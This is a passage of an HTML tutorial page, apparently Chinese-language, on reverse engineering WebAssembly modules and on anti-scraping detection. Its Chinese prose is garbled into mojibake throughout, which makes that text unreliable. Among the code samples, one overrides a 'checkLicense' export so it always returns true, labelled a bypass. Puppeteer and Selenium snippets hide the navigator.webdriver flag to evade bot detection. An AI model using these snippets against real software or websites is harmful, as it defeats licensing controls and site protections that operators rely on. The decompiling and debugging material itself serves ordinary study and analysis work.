        Start[Start Section&lt;br/&gt;å¯åŠ¨å‡½æ•°&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;æ¨¡å—å®ä¾‹åŒ–æ—¶è°ƒç”¨]

        Element[Element Section&lt;br/&gt;è¡¨åˆå§‹åŒ–&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;åˆå§‹åŒ–å‡½æ•°è¡¨]

        Code[Code Section&lt;br/&gt;å‡½æ•°ä½“&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å±€éƒ¨å˜é‡&lt;br/&gt;â€¢ æŒ‡ä»¤åºåˆ—]

        Data[Data Section&lt;br/&gt;æ•°æ®æ®µ&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ é™æ€æ•°æ®&lt;br/&gt;â€¢ å­—ç¬¦ä¸²å¸¸é‡]
    end

    Header --&gt; Type
    Type --&gt; Import
    Import --&gt; Function
    Function --&gt; Table
    Table --&gt; Memory
    Memory --&gt; Global
    Global --&gt; Export
    Export --&gt; Start
    Start --&gt; Element
    Element --&gt; Code
    Code --&gt; Data

    style Header fill:#4a90e2
    style Code fill:#f5a623
    style Export fill:#7ed321
    style Memory fill:#bd10e0
</code></pre>
<h4>2. æŒ‡ä»¤é›†æ¶æ„</h4>
<p>WebAssembly ä½¿ç”¨åŸºäºå †æ ˆçš„æŒ‡ä»¤é›†ï¼š</p>
<ul>
<li><strong>æ•°å€¼æ“ä½œ</strong>: <code>i32.add</code>, <code>i64.mul</code>, <code>f32.div</code>, <code>f64.sqrt</code></li>
<li><strong>å†…å­˜æ“ä½œ</strong>: <code>i32.load</code>, <code>i64.store</code>, <code>memory.grow</code></li>
<li><strong>æ§åˆ¶æµ</strong>: <code>block</code>, <code>loop</code>, <code>if</code>, <code>br</code>, <code>call</code></li>
<li><strong>å˜é‡æ“ä½œ</strong>: <code>local.get</code>, <code>local.set</code>, <code>global.get</code></li>
</ul>
<h4>3. ä¸ JavaScript äº¤äº’</h4>
<pre><code class="language-mermaid">sequenceDiagram
    participant JS as JavaScript
    participant Browser as æµè§ˆå™¨
    participant Wasm as WebAssembly&lt;br/&gt;å®ä¾‹

    Note over JS,Wasm: é˜¶æ®µ 1: åŠ è½½ä¸ç¼–è¯‘

    JS-&gt;&gt;Browser: fetch('module.wasm')
    Browser--&gt;&gt;JS: ArrayBuffer

    JS-&gt;&gt;Browser: WebAssembly.compile(buffer)
    Note over Browser: éªŒè¯ Wasm å­—èŠ‚ç &lt;br/&gt;ç¼–è¯‘ä¸ºæœºå™¨ç 

    Browser--&gt;&gt;JS: WebAssembly.Module

    Note over JS,Wasm: é˜¶æ®µ 2: å®ä¾‹åŒ–

    JS-&gt;&gt;Browser: WebAssembly.instantiate(module, imports)
    Note over Browser: åˆ›å»º Wasm å®ä¾‹&lt;br/&gt;åˆå§‹åŒ–å†…å­˜&lt;br/&gt;æ‰§è¡Œ start å‡½æ•°

    Browser-&gt;&gt;Wasm: åˆå§‹åŒ–
    Wasm--&gt;&gt;Browser: Instance

    Browser--&gt;&gt;JS: WebAssembly.Instance

    Note over JS,Wasm: é˜¶æ®µ 3: ç›¸äº’è°ƒç”¨

    JS-&gt;&gt;Wasm: instance.exports.encrypt(data)
    Note over Wasm: æ‰§è¡Œ Wasm å‡½æ•°&lt;br/&gt;å¤„ç†æ•°æ®
    Wasm--&gt;&gt;JS: result

    Note over Wasm: éœ€è¦ JS åŠŸèƒ½
    Wasm-&gt;&gt;JS: imports.console.log(message)
    Note over JS: æ‰§è¡Œ JS å‡½æ•°
    JS--&gt;&gt;Wasm: void

    Note over JS,Wasm: é˜¶æ®µ 4: å†…å­˜å…±äº«

    JS-&gt;&gt;Wasm: instance.exports.memory
    Note over JS: è®¿é—® Wasm çº¿æ€§å†…å­˜&lt;br/&gt;è¯»å†™æ•°æ®
    JS-&gt;&gt;Wasm: new Uint8Array(memory.buffer)
</code></pre>
<p><strong>ä»£ç ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŠ è½½ WebAssembly æ¨¡å—
const response = await fetch(&quot;module.wasm&quot;);
const buffer = await response.arrayBuffer();

// å‡†å¤‡å¯¼å…¥å¯¹è±¡ï¼ˆWasm éœ€è¦çš„ JS åŠŸèƒ½ï¼‰
const imports = {
  env: {
    console_log: (ptr, len) =&gt; {
      // ä» Wasm å†…å­˜è¯»å–å­—ç¬¦ä¸²
      const memory = instance.exports.memory;
      const bytes = new Uint8Array(memory.buffer, ptr, len);
      const text = new TextDecoder().decode(bytes);
      console.log(text);
    },
  },
};

// ç¼–è¯‘å¹¶å®ä¾‹åŒ–
const module = await WebAssembly.compile(buffer);
const instance = await WebAssembly.instantiate(module, imports);

// è°ƒç”¨å¯¼å‡ºçš„å‡½æ•°
const result = instance.exports.myFunction(42);

// è®¿é—®å¯¼å‡ºçš„å†…å­˜
const memory = instance.exports.memory;
const dataView = new DataView(memory.buffer);
</code></pre>
<hr />
<h2>è¯¦ç»†å†…å®¹</h2>
<h3>WebAssembly é€†å‘å·¥ä½œæµç¨‹</h3>
<pre><code class="language-mermaid">flowchart TD
    Start[å‘ç°ç›®æ ‡ä½¿ç”¨ Wasm] --&gt; Extract[æå– Wasm æ¨¡å—]

    Extract --&gt; Method{é€‰æ‹©åˆ†ææ–¹æ³•}

    Method --&gt;|é™æ€åˆ†æ| Static[é™æ€åˆ†æè·¯å¾„]
    Method --&gt;|åŠ¨æ€åˆ†æ| Dynamic[åŠ¨æ€åˆ†æè·¯å¾„]
    Method --&gt;|æ··åˆåˆ†æ| Hybrid[é™æ€ + åŠ¨æ€]

    subgraph StaticAnalysis[&quot;é™æ€åˆ†ææµç¨‹&quot;]
        Static --&gt; Convert[è½¬æ¢æ ¼å¼]
        Convert --&gt; WAT[wasm2wat&lt;br/&gt;ç”Ÿæˆ WAT æ–‡æœ¬]
        Convert --&gt; Decompile[wasm-decompile&lt;br/&gt;ç”Ÿæˆä¼ª C ä»£ç ]
        Convert --&gt; IDA[IDA Pro/Ghidra&lt;br/&gt;åæ±‡ç¼–åˆ†æ]

        WAT --&gt; Identify[è¯†åˆ«å…³é”®å‡½æ•°]
        Decompile --&gt; Identify
        IDA --&gt; Identify

        Identify --&gt; Structure[åˆ†ææ¨¡å—ç»“æ„&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å¯¼å…¥/å¯¼å‡º&lt;br/&gt;â€¢ å‡½æ•°è°ƒç”¨å…³ç³»&lt;br/&gt;â€¢ æ•°æ®æµåˆ†æ]

        Structure --&gt; Algorithm[è¯†åˆ«ç®—æ³•&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åŠ å¯†ç®—æ³•&lt;br/&gt;â€¢ ç­¾åç”Ÿæˆ&lt;br/&gt;â€¢ æ•°æ®å¤„ç†]
    end

    subgraph DynamicAnalysis[&quot;åŠ¨æ€åˆ†ææµç¨‹&quot;]
        Dynamic --&gt; Hook[Hook æŠ€æœ¯]

        Hook --&gt; HookExport[Hook å¯¼å‡ºå‡½æ•°&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è®°å½•å‚æ•°&lt;br/&gt;â€¢ è®°å½•è¿”å›å€¼]

        Hook --&gt; HookImport[Hook å¯¼å…¥å‡½æ•°&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ æ‹¦æˆª JS è°ƒç”¨&lt;br/&gt;â€¢ ä¿®æ”¹å‚æ•°]

        Hook --&gt; HookMemory[Hook å†…å­˜è®¿é—®&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç›‘æ§è¯»å†™&lt;br/&gt;â€¢ æ•°æ®æµè¿½è¸ª]

        HookExport --&gt; Debug[åŠ¨æ€è°ƒè¯•]
        HookImport --&gt; Debug
        HookMemory --&gt; Debug

        Debug --&gt; DevTools[Chrome DevTools&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è®¾ç½®æ–­ç‚¹&lt;br/&gt;â€¢ å•æ­¥æ‰§è¡Œ&lt;br/&gt;â€¢ æŸ¥çœ‹å †æ ˆ]

        Debug --&gt; Instrumentation[ä»£ç æ’æ¡©&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ æ³¨å…¥æ—¥å¿—&lt;br/&gt;â€¢ ä¿®æ”¹é€»è¾‘]
    end

    subgraph Replication[&quot;å¤ç°ä¸åˆ©ç”¨&quot;]
        Algorithm --&gt; Understand[ç†è§£ç®—æ³•é€»è¾‘]
        DevTools --&gt; Understand
        Instrumentation --&gt; Understand

        Understand --&gt; Replicate{å¤ç°æ–¹å¼}

        Replicate --&gt;|Python/JS| JSImpl[JavaScript/Python&lt;br/&gt;é‡æ–°å®ç°ç®—æ³•]

        Replicate --&gt;|ç›´æ¥è°ƒç”¨| DirectCall[ç›´æ¥è°ƒç”¨ Wasm&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åŠ è½½æ¨¡å—&lt;br/&gt;â€¢ è°ƒç”¨å‡½æ•°]

        Replicate --&gt;|æå–ä»£ç | Extract2[æå–å…³é”®ä»£ç &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ç¼–è¯‘ä¸ºç‹¬ç«‹æ¨¡å—&lt;br/&gt;â€¢ é›†æˆåˆ°å·¥å…·]

        JSImpl --&gt; Verify[éªŒè¯æ­£ç¡®æ€§]
        DirectCall --&gt; Verify
        Extract2 --&gt; Verify
    end

    Verify --&gt; Success{éªŒè¯æˆåŠŸ?}
    Success --&gt;|æ˜¯| Done[å®Œæˆé€†å‘&lt;br/&gt;é›†æˆåˆ°çˆ¬è™«/å·¥å…·]
    Success --&gt;|å¦| Refine[ç»†åŒ–åˆ†æ]
    Refine --&gt; Method

    style Start fill:#4a90e2
    style Done fill:#51cf66
    style Algorithm fill:#f5a623
    style Understand fill:#f5a623
</code></pre>
<h3>ä¸»è¦é€†å‘æ–¹æ³•</h3>
<h4>1. <strong>é™æ€åˆ†æ</strong></h4>
<h5>å·¥å…·é“¾</h5>
<ul>
<li><p><strong>wasm2wat</strong>: å°†äºŒè¿›åˆ¶ Wasm è½¬æ¢ä¸ºå¯è¯»çš„ WAT (WebAssembly Text Format)</p>
<pre><code class="language-bash">wasm2wat module.wasm -o module.wat
</code></pre>
</li>
<li><p><strong>wasm-objdump</strong>: æŸ¥çœ‹æ¨¡å—ç»“æ„å’Œåæ±‡ç¼–</p>
<pre><code class="language-bash">wasm-objdump -x module.wasm  # æ˜¾ç¤ºæ‰€æœ‰æ®µ
wasm-objdump -d module.wasm  # åæ±‡ç¼–
</code></pre>
</li>
<li><p><strong>wasm-decompile</strong>: å°† Wasm åç¼–è¯‘ä¸ºä¼ª C ä»£ç </p>
<pre><code class="language-bash">wasm-decompile module.wasm -o output.c
</code></pre>
</li>
<li><p><strong>IDA Pro / Ghidra</strong>: æ”¯æŒ WebAssembly çš„åæ±‡ç¼–å’Œåç¼–è¯‘</p>
<ul>
<li>IDA Pro 7.5+ åŸç”Ÿæ”¯æŒ Wasm</li>
<li>Ghidra éœ€è¦å®‰è£… Wasm æ’ä»¶</li>
</ul>
</li>
</ul>
<h5>åˆ†ææ­¥éª¤</h5>
<ol>
<li><p><strong>æå– Wasm æ¨¡å—</strong></p>
<pre><code class="language-javascript">// ä»ç½‘é¡µä¸­æ‹¦æˆª Wasm åŠ è½½
const originalFetch = window.fetch;
window.fetch = function (...args) {
  return originalFetch.apply(this, args).then((response) =&gt; {
    if (args[0].endsWith(&quot;.wasm&quot;)) {
      response
        .clone()
        .arrayBuffer()
        .then((buffer) =&gt; {
          // ä¿å­˜åˆ°æœ¬åœ°
          const blob = new Blob([buffer], { type: &quot;application/wasm&quot; });
          const url = URL.createObjectURL(blob);
          console.log(&quot;Wasm module:&quot;, url);
        });
    }
    return response;
  });
};
</code></pre>
</li>
<li><p><strong>è¯†åˆ«å¯¼å‡ºå‡½æ•°</strong></p>
<pre><code class="language-bash">wasm-objdump -j export module.wasm
</code></pre>
</li>
<li><p><strong>åˆ†æå‡½æ•°è°ƒç”¨å…³ç³»</strong></p>
<ul>
<li>æŸ¥çœ‹ Import/Export Section</li>
<li>è¿½è¸ª call æŒ‡ä»¤</li>
<li>åˆ†æé—´æ¥è°ƒç”¨ (call_indirect)</li>
</ul>
</li>
</ol>
<h4>2. <strong>åŠ¨æ€è°ƒè¯•</strong></h4>
<h5>Chrome DevTools</h5>
<p>Chrome DevTools æ”¯æŒ WebAssembly è°ƒè¯•ï¼š</p>
<ol>
<li>åœ¨ Sources é¢æ¿ä¸­å¯ä»¥çœ‹åˆ° Wasm æ¨¡å—</li>
<li>è®¾ç½®æ–­ç‚¹ï¼ˆæ˜¾ç¤ºä¸º WAT æ ¼å¼ï¼‰</li>
<li>å•æ­¥æ‰§è¡Œ</li>
<li>æŸ¥çœ‹å †æ ˆå’Œå˜é‡</li>
</ol>
<h5>Wasmer/Wasmtime è°ƒè¯•</h5>
<p>ä½¿ç”¨ç‹¬ç«‹è¿è¡Œæ—¶è°ƒè¯•ï¼š</p>
<pre><code class="language-bash"># ä½¿ç”¨ Wasmtime è¿è¡Œå¹¶è°ƒè¯•
wasmtime run --invoke function_name module.wasm

# ä½¿ç”¨ Wasmer
wasmer run module.wasm --invoke function_name
</code></pre>
<h5>å†…å­˜æ£€æŸ¥</h5>
<pre><code class="language-javascript">// è®¿é—® Wasm çº¿æ€§å†…å­˜
const memory = instance.exports.memory;
const buffer = new Uint8Array(memory.buffer);

// è¯»å–ç‰¹å®šåœ°å€çš„æ•°æ®
const dataView = new DataView(memory.buffer);
const value = dataView.getInt32(address, true); // true = little-endian

// Hook å†…å­˜è®¿é—®
const originalMemory = instance.exports.memory;
Object.defineProperty(instance.exports, &quot;memory&quot;, {
  get: function () {
    console.log(&quot;Memory accessed&quot;);
    return originalMemory;
  },
});
</code></pre>
<h4>3. <strong>Hook æŠ€æœ¯</strong></h4>
<h5>Hook å¯¼å‡ºå‡½æ•°</h5>
<pre><code class="language-javascript">// Hook Wasm å¯¼å‡ºå‡½æ•°
const originalFunc = instance.exports.encrypt;
instance.exports.encrypt = function (...args) {
  console.log(&quot;encrypt called with:&quot;, args);
  const result = originalFunc.apply(this, args);
  console.log(&quot;encrypt returned:&quot;, result);
  return result;
};
</code></pre>
<h5>Hook å¯¼å…¥å‡½æ•°</h5>
<pre><code class="language-javascript">// åœ¨å®ä¾‹åŒ–æ—¶æä¾› Hook çš„å¯¼å…¥
const imports = {
  env: {
    // Hook åŸæœ¬ç”± JavaScript æä¾›çš„å‡½æ•°
    console_log: function (ptr, len) {
      const memory = instance.exports.memory;
      const bytes = new Uint8Array(memory.buffer, ptr, len);
      const str = new TextDecoder().decode(bytes);
      console.log(&quot;[Wasm Log]:&quot;, str);
    },
  },
};

const instance = await WebAssembly.instantiate(module, imports);
</code></pre>
<h5>Frida Hook</h5>
<pre><code class="language-javascript">// ä½¿ç”¨ Frida Hook WebAssembly
Interceptor.attach(Module.findExportByName(null, &quot;wasm_function&quot;), {
  onEnter: function (args) {
    console.log(&quot;Arguments:&quot;, args[0], args[1]);
  },
  onLeave: function (retval) {
    console.log(&quot;Return value:&quot;, retval);
  },
});
</code></pre>
<hr />
<h2>å®æˆ˜ç¤ºä¾‹</h2>
<h3>ç¤ºä¾‹ 1: åç¼–è¯‘åŠ å¯†å‡½æ•°</h3>
<p>å‡è®¾æŸç½‘ç«™ä½¿ç”¨ Wasm å®ç°åŠ å¯†ç®—æ³•ï¼š</p>
<pre><code class="language-javascript">// 1. æ‹¦æˆªå¹¶ä¿å­˜ Wasm æ¨¡å—
let wasmModule;
const originalInstantiate = WebAssembly.instantiate;
WebAssembly.instantiate = async function (bytes, imports) {
  wasmModule = bytes;
  console.log(&quot;Captured Wasm module, size:&quot;, bytes.byteLength);

  // ä¿å­˜åˆ° IndexedDB ä»¥ä¾¿åç»­åˆ†æ
  const blob = new Blob([bytes], { type: &quot;application/wasm&quot; });
  const url = URL.createObjectURL(blob);
  console.log(&quot;Download URL:&quot;, url);

  return originalInstantiate.call(this, bytes, imports);
};

// 2. ä½¿ç”¨ wasm2wat è½¬æ¢
// $ wasm2wat crypto.wasm -o crypto.wat

// 3. åˆ†æ WAT ä»£ç æ‰¾åˆ°åŠ å¯†é€»è¾‘
// (func $encrypt (param $0 i32) (param $1 i32) (result i32)
//   local.get $0
//   local.get $1
//   i32.xor
//   i32.const 0x5A5A5A5A
//   i32.add
// )

// 4. åœ¨ JavaScript ä¸­é‡æ–°å®ç°
function decryptedEncrypt(data, key) {
  return (data ^ key) + 0x5a5a5a5a;
}
</code></pre>
<h3>ç¤ºä¾‹ 2: ä¿®æ”¹ Wasm è¡Œä¸º</h3>
<pre><code class="language-javascript">// ä¿®æ”¹ Wasm å‡½æ•°çš„è¿”å›å€¼
const instance = await WebAssembly.instantiate(module);

// ä¿å­˜åŸå§‹å‡½æ•°
const originalCheckLicense = instance.exports.checkLicense;

// æ›¿æ¢å‡½æ•°è®©å…¶æ€»æ˜¯è¿”å› true
instance.exports.checkLicense = function () {
  console.log(&quot;License check bypassed&quot;);
  return 1; // è¿”å› true
};
</code></pre>
<h3>ç¤ºä¾‹ 3: å†…å­˜ Dump åˆ†æ</h3>
<pre><code class="language-javascript">// Dump Wasm çº¿æ€§å†…å­˜
function dumpMemory(instance, start, length) {
  const memory = new Uint8Array(instance.exports.memory.buffer);
  const data = memory.slice(start, start + length);

  // è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²
  const hex = Array.from(data)
    .map((b) =&gt; b.toString(16).padStart(2, &quot;0&quot;))
    .join(&quot; &quot;);

  console.log(
    `Memory [${start.toString(16)}-${(start + length).toString(16)}]:`,
    hex
  );

  // å°è¯•ä½œä¸ºå­—ç¬¦ä¸²è§£æ
  try {
    const str = new TextDecoder().decode(data);
    console.log(&quot;As string:&quot;, str);
  } catch (e) {}

  return data;
}

// ä½¿ç”¨
dumpMemory(instance, 0x1000, 256);
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>é€†å‘åˆ†ææµç¨‹</h3>
<ol>
<li><p><strong>ä¿¡æ¯æ”¶é›†</strong></p>
<ul>
<li>è¯†åˆ« Wasm æ¨¡å—çš„åŠ è½½æ–¹å¼</li>
<li>ç¡®å®šæ¨¡å—ä¸ JavaScript çš„äº¤äº’æ¥å£</li>
<li>è®°å½•å¯¼å…¥/å¯¼å‡ºå‡½æ•°</li>
</ul>
</li>
<li><p><strong>é™æ€åˆ†æä¼˜å…ˆ</strong></p>
<ul>
<li>ä½¿ç”¨ wasm2wat è·å–å¯è¯»æ ¼å¼</li>
<li>ä½¿ç”¨ wasm-decompile è·å¾—ä¼ªä»£ç </li>
<li>åœ¨ IDA Pro/Ghidra ä¸­æ·±å…¥åˆ†æ</li>
</ul>
</li>
<li><p><strong>åŠ¨æ€éªŒè¯</strong></p>
<ul>
<li>ä½¿ç”¨ Chrome DevTools è°ƒè¯•</li>
<li>Hook å…³é”®å‡½æ•°éªŒè¯å‡è®¾</li>
<li>ç›‘æ§å†…å­˜å˜åŒ–</li>
</ul>
</li>
<li><p><strong>æ–‡æ¡£åŒ–å‘ç°</strong></p>
<ul>
<li>è®°å½•å‡½æ•°ç­¾åå’Œç”¨é€”</li>
<li>ç»˜åˆ¶è°ƒç”¨å…³ç³»å›¾</li>
<li>æ ‡æ³¨å…³é”®ç®—æ³•</li>
</ul>
</li>
</ol>
<h3>å¸¸ç”¨æŠ€å·§</h3>
<ol>
<li><p><strong>è¯†åˆ«å­—ç¬¦ä¸²</strong>: Wasm æ²¡æœ‰å­—ç¬¦ä¸²ç±»å‹ï¼Œé€šå¸¸å­˜å‚¨åœ¨çº¿æ€§å†…å­˜ä¸­</p>
<pre><code class="language-bash">strings module.wasm | grep -i &quot;password&quot;
</code></pre>
</li>
<li><p><strong>å¯»æ‰¾å¯†é’¥</strong>: åœ¨ Data Section ä¸­æŸ¥æ‰¾å¯ç–‘å¸¸é‡</p>
<pre><code class="language-bash">wasm-objdump -s -j data module.wasm
</code></pre>
</li>
<li><p><strong>è¿½è¸ªç®—æ³•</strong>: è¯†åˆ«å¸¸è§åŠ å¯†ç®—æ³•çš„ç‰¹å¾æ¨¡å¼</p>
<ul>
<li>AES: S-box æŸ¥æ‰¾è¡¨</li>
<li>RSA: å¤§æ•´æ•°è¿ç®—</li>
<li>SHA: å›ºå®šçš„åˆå§‹åŒ–å‘é‡</li>
</ul>
</li>
</ol>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: å¦‚ä½•ä»ç½‘é¡µä¸­æå– Wasm æ¨¡å—ï¼Ÿ</h3>
<p><strong>A</strong>: æœ‰å¤šç§æ–¹æ³•ï¼š</p>
<ol>
<li><strong>Network é¢æ¿</strong>: åœ¨ Chrome DevTools çš„ Network æ ‡ç­¾ä¸­è¿‡æ»¤ <code>.wasm</code> æ–‡ä»¶</li>
<li><strong>è¦†ç›– WebAssembly API</strong>: æ‹¦æˆª <code>fetch</code> æˆ– <code>WebAssembly.instantiate</code></li>
<li><strong>æµè§ˆå™¨æ‰©å±•</strong>: ä½¿ç”¨ Wasm Dumper ç­‰æ‰©å±•</li>
<li><strong>ä»£ç†å·¥å…·</strong>: ä½¿ç”¨ Burp Suite æˆ– mitmproxy æ‹¦æˆª</li>
</ol>
<h3>Q: Wasm èƒ½å¦è¢«æ··æ·†ï¼Ÿ</h3>
<p><strong>A</strong>: å¯ä»¥ï¼Œä½†æ•ˆæœæœ‰é™ï¼š</p>
<ul>
<li>å˜é‡ååœ¨ç¼–è¯‘åä¼šä¸¢å¤±</li>
<li>å‡½æ•°å¯ä»¥è¢«é‡å‘½å</li>
<li>æ§åˆ¶æµå¯ä»¥è¢«æ··æ·†ï¼ˆæ’å…¥æ­»ä»£ç ã€æ‹†åˆ†åŸºæœ¬å—ï¼‰</li>
<li>å¸¸é‡å¯ä»¥è¢«åŠ å¯†</li>
<li>ä½†æŒ‡ä»¤é›†æœ‰é™ï¼Œæ¨¡å¼è¯†åˆ«ç›¸å¯¹å®¹æ˜“</li>
</ul>
<h3>Q: å¦‚ä½•å¤„ç†åŠ å¯†çš„ Wasm æ¨¡å—ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li>åœ¨ <code>WebAssembly.compile</code> æˆ– <code>instantiate</code> å¤„ä¸‹æ–­ç‚¹</li>
<li>æ­¤æ—¶æ¨¡å—å·²è§£å¯†ï¼Œä»å†…å­˜ä¸­æå–</li>
<li>æˆ–è€… Hook è§£å¯†å‡½æ•°ï¼Œè®°å½•è§£å¯†åçš„å­—èŠ‚</li>
</ol>
<h3>Q: Wasm é€†å‘æ¯” JavaScript é€†å‘æ›´éš¾å—ï¼Ÿ</h3>
<p><strong>A</strong>: å„æœ‰ç‰¹ç‚¹ï¼š</p>
<ul>
<li><strong>Wasm ä¼˜åŠ¿</strong>: æŒ‡ä»¤é›†ç®€å•ã€ç±»å‹æ˜ç¡®ã€æ— åŠ¨æ€ç‰¹æ€§</li>
<li><strong>Wasm åŠ£åŠ¿</strong>: ç¼ºå°‘ç¬¦å·ä¿¡æ¯ã€ç¼–è¯‘ä¼˜åŒ–å¯¼è‡´ä»£ç å¤æ‚</li>
<li><strong>æ€»ä½“</strong>: å°å‹ Wasm æ¨¡å—é€šå¸¸æ›´å®¹æ˜“åˆ†æï¼Œå¤§å‹æ¨¡å—éœ€è¦ä¸“ä¸šå·¥å…·</li>
</ul>
<hr />
<h2>è¿›é˜¶é˜…è¯»</h2>
<h3>å®˜æ–¹èµ„æº</h3>
<ul>
<li><a href="https://webassembly.github.io/spec/">WebAssembly å®˜æ–¹è§„èŒƒ</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/WebAssembly">MDN WebAssembly æ–‡æ¡£</a></li>
<li><a href="https://webassembly.github.io/spec/core/exec/instructions.html">WebAssembly æŒ‡ä»¤é›†å‚è€ƒ</a></li>
</ul>
<h3>å·¥å…·ä¸é¡¹ç›®</h3>
<ul>
<li><a href="https://github.com/WebAssembly/wabt">WABT (WebAssembly Binary Toolkit)</a> - å®˜æ–¹å·¥å…·é›†</li>
<li><a href="https://github.com/WebAssembly/binaryen">Binaryen</a> - ä¼˜åŒ–å’Œç¼–è¯‘å·¥å…·</li>
<li><a href="https://wasmtime.dev/">wasmtime</a> - ç‹¬ç«‹ Wasm è¿è¡Œæ—¶</li>
<li><a href="https://wasmer.io/">wasmer</a> - å¦ä¸€ä¸ª Wasm è¿è¡Œæ—¶</li>
</ul>
<h3>å®‰å…¨ç ”ç©¶</h3>
<ul>
<li><a href="https://www.ndss-symposium.org/wp-content/uploads/2020/02/23071-paper.pdf">WebAssembly Security: Potentials and Pitfalls</a></li>
<li><a href="https://www.usenix.org/system/files/sec20-lehmann.pdf">Everything Old is New Again: Binary Security of WebAssembly</a></li>
<li><a href="https://webassembly-security.com/">Analyzing WebAssembly Binaries</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-35">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></li>
<li><a href="#section-38">å‰ç«¯åŠ å›ºæŠ€æœ¯</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li>æµè§ˆå™¨è°ƒè¯•æŠ€å·§</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-37">
                                                <h2>[R36] Anti-Scraping Deep Dive</h2>
                                                <h1>R36: åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</h1>
<h2>æ¦‚è¿°</h2>
<p>ç°ä»£ç½‘ç«™é‡‡ç”¨å¤šå±‚æ¬¡ã€å¤šç»´åº¦çš„åçˆ¬è™«ä½“ç³»ã€‚æœ¬ç« æ·±å…¥åˆ†æä¸»æµåçˆ¬è™«æŠ€æœ¯çš„åŸç†ã€æ£€æµ‹æ–¹æ³•åŠå¯¹æŠ—ç­–ç•¥ã€‚</p>
<hr />
<h2>åçˆ¬è™«æŠ€æœ¯åˆ†ç±»</h2>
<h3>1. åŸºäºè¡Œä¸ºçš„æ£€æµ‹</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>è¯·æ±‚é¢‘ç‡å¼‚å¸¸ï¼ˆçŸ­æ—¶é—´å¤§é‡è¯·æ±‚ï¼‰</li>
<li>è®¿é—®æ¨¡å¼å¼‚å¸¸ï¼ˆåªè®¿é—® APIï¼Œä¸è®¿é—®é™æ€èµ„æºï¼‰</li>
<li>ç”¨æˆ·è¡Œä¸ºç¼ºå¤±ï¼ˆæ— é¼ æ ‡ç§»åŠ¨ã€é”®ç›˜äº‹ä»¶ï¼‰</li>
</ul>
<p><strong>æ£€æµ‹æ–¹æ³•</strong>:</p>
<pre><code class="language-python"># æœåŠ¡ç«¯æ£€æµ‹é€»è¾‘ç¤ºä¾‹
def is_bot_behavior(request_log):
    # 1. æ£€æŸ¥è¯·æ±‚é¢‘ç‡
    if request_log.count_in_last_minute() &gt; 100:
        return True

    # 2. æ£€æŸ¥ User-Agent
    if not request_log.has_valid_user_agent():
        return True

    # 3. æ£€æŸ¥ Referer é“¾
    if not request_log.has_valid_referer_chain():
        return True

    return False
</code></pre>
<p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>
<ul>
<li>æ·»åŠ éšæœºå»¶è¿Ÿï¼š<code>time.sleep(random.uniform(1, 3))</code></li>
<li>æ¨¡æ‹Ÿå®Œæ•´çš„æµè§ˆè¡Œä¸ºï¼šè®¿é—®é¦–é¡µ -&gt; åˆ—è¡¨é¡µ -&gt; è¯¦æƒ…é¡µ</li>
<li>åŠ è½½é™æ€èµ„æºï¼ˆCSS/JS/å›¾ç‰‡ï¼‰</li>
</ul>
<hr />
<h3>2. åŸºäº JavaScript çš„æ£€æµ‹</h3>
<h4>æ£€æµ‹ webdriver</h4>
<p><strong>æ£€æµ‹ä»£ç </strong>:</p>
<pre><code class="language-javascript">if (navigator.webdriver) {
  console.log(&quot;Bot detected!&quot;);
}

// æ£€æµ‹ Selenium ç‰¹å¾
if (window.document.documentElement.getAttribute(&quot;webdriver&quot;)) {
  console.log(&quot;Selenium detected!&quot;);
}

// æ£€æµ‹ PhantomJS
if (window.callPhantom || window._phantom) {
  console.log(&quot;PhantomJS detected!&quot;);
}
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// Puppeteer
await page.evaluateOnNewDocument(() =&gt; {
    Object.defineProperty(navigator, 'webdriver', {
        get: () =&gt; undefined
    });

    delete navigator.__proto__.webdriver;
});

// Selenium
options.add_argument('--disable-blink-features=AutomationControlled')
driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
    'source': '''
        Object.defineProperty(navigator, 'webdriver', {
            get: () =&gt; undefined
        })
    '''
})
</code></pre>
<h4>æ£€æµ‹ Chrome Headless</h4>
<p><strong>æ£€æµ‹ä»£ç </strong>:</p>
<pre><code class="language-javascript">// æ£€æµ‹ User-Agent
if (/HeadlessChrome/.test(navigator.userAgent)) {
  console.log(&quot;Headless detected!&quot;);
}

// æ£€æµ‹æ’ä»¶æ•°é‡
if (navigator.plugins.length === 0) {
  console.log(&quot;Headless detected!&quot;);
}

// æ£€æµ‹ Chrome å¯¹è±¡
if (!window.chrome || !window.chrome.runtime) {
  console.log(&quot;Not real Chrome!&quot;);
}
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// ä¼ªé€  User-Agent
